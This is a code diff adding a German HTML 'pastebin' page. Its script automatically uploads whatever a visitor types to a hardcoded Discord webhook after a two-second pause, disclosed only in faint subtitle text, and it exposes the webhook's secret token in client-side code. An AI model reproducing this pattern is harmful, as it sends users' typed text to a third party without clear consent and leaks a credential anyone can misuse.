@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>pastebin</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    min-height: 100vh; background: #0a0f1a;
+    display: flex; justify-content: center; align-items: flex-start;
+    padding: 24px; overflow-y: auto;
+  }
+  .bg-glow {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
+  }
+  .container { position: relative; z-index: 1; text-align: center; max-width: 680px; width: 100%; padding: 32px 20px; }
+  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
+  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
+  textarea {
+    width: 100%; min-height: 260px; padding: 16px;
+    background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px; color: rgba(255,255,255,0.6);
+    font: inherit; font-size: 0.8rem; line-height: 1.6;
+    resize: vertical; outline: none; transition: border-color 0.2s;
+    font-family: 'Courier New', 'Consolas', monospace;
+  }
+  textarea:focus { border-color: rgba(129,140,248,0.3); }
+  textarea::placeholder { color: rgba(255,255,255,0.12); }
+  .info { display: flex; gap: 12px; justify-content: space-between; align-items: center; margin-top: 10px; }
+  .info .count { color: rgba(255,255,255,0.15); font-size: 0.65rem; }
+  .info .status { color: rgba(16,185,129,0.4); font-size: 0.65rem; }
+  .pastes { margin-top: 20px; display: none; }
+  .pastes.show { display: block; }
+  .paste-item {
+    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px; padding: 10px 14px; margin-bottom: 8px;
+    text-align: left; animation: fadeIn 0.3s ease;
+    display: flex; align-items: center; gap: 12px;
+  }
+  @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+  .paste-item .preview { color: rgba(255,255,255,0.4); font-size: 0.7rem; font-family: 'Courier New', monospace; flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .paste-item .meta { color: rgba(255,255,255,0.12); font-size: 0.55rem; flex-shrink: 0; }
+  .paste-item .status { color: rgba(16,185,129,0.5); font-size: 0.6rem; flex-shrink: 0; }
+  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
+  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
+</style>
+</head>
+<body>
+<div class="bg-glow"></div>
+<div class="container">
+  <h1><span>paste</span>bin</h1>
+  <div class="sub">text pasten · automatisch an discord</div>
+  <textarea id="textInput" placeholder="text hier pasten oder tippen …"></textarea>
+  <div class="info">
+    <span class="count" id="charCount">0 zeichen</span>
+    <span class="status" id="status"></span>
+  </div>
+  <div class="pastes" id="pastes"></div>
+  <div class="nav-links">
+    <a href="index.html">📸 filterit</a>
+    <a href="convert.html">🔄 bildwerk</a>
+    <a href="metadata.html">🔍 metadaten</a>
+    <a href="ascii.html">🎨 ascii</a>
+    <a href="filedrop.html">📁 filedrop</a>
+    <a href="audio.html">🎙️ audio</a>
+    <a href="video.html">📹 video</a>
+    <a href="qr.html">📱 qr</a>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+const textInput = document.getElementById('textInput');
+const charCount = document.getElementById('charCount');
+const statusEl = document.getElementById('status');
+const pastes = document.getElementById('pastes');
+
+let debounceTimer = null;
+let lastText = '';
+
+textInput.addEventListener('input', () => {
+  const len = textInput.value.length;
+  charCount.textContent = `${len} zeichen`;
+  clearTimeout(debounceTimer);
+  if (len === 0 || textInput.value === lastText) return;
+  debounceTimer = setTimeout(() => {
+    const text = textInput.value;
+    if (!text.trim() || text === lastText) return;
+    lastText = text;
+    send(text);
+  }, 2000);
+});
+
+function send(text) {
+  const ts = Date.now();
+  const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+  const fd = new FormData();
+  const name = `paste_${ts}.txt`;
+  fd.append('file', blob, name);
+  const preview = text.length > 80 ? text.slice(0, 80) + '…' : text;
+  fd.append('payload_json', JSON.stringify({ content: `📝 **${name}**\n\`\`\`\n${preview}\n\`\`\`` }));
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+  pastes.classList.add('show');
+  const div = document.createElement('div');
+  div.className = 'paste-item';
+  const now = new Date(ts).toLocaleTimeString();
+  div.innerHTML = `<div class="preview">${escapeHtml(preview)}</div><div class="meta">${text.length} B · ${now}</div><div class="status">✅</div>`;
+  pastes.prepend(div);
+  while (pastes.children.length > 20) pastes.lastChild.remove();
+  statusEl.textContent = `gesendet · ${preview}`;
+  setTimeout(() => { statusEl.textContent = ''; }, 3000);
+}
+
+function escapeHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+</script>
+</body>
+</html>
